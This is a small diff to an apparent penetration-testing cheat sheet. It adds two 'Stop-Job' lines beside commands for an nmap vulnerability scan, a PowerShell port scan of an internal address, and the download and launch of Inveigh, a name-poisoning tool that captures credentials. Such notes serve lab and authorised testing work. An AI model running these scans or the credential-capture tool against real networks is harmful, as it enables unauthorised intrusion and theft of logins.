@@ -152,6 +152,7 @@ nmap -n -Pn --script vuln 10.10.10.248
 # on powershell
 Start-Job {1..8000 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.221.151", $_)) "TCP port $_ is open"} 2>$null}
 Receive-Job -Id 
+Stop-Job -Id 
 ```
 
 # Recon
@@ -662,6 +663,7 @@ wget https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.10/Inveig
 unzip Inveigh-net4.6.2-v2.0.10.zip
 Start-Job {.\Inveigh.exe -Console 5 -NBNS y -FileOutput y -LogOutput y}
 Receive-Job -Id
+Stop-Job -Id 
 ```
 ## PsExec
 ```powershell
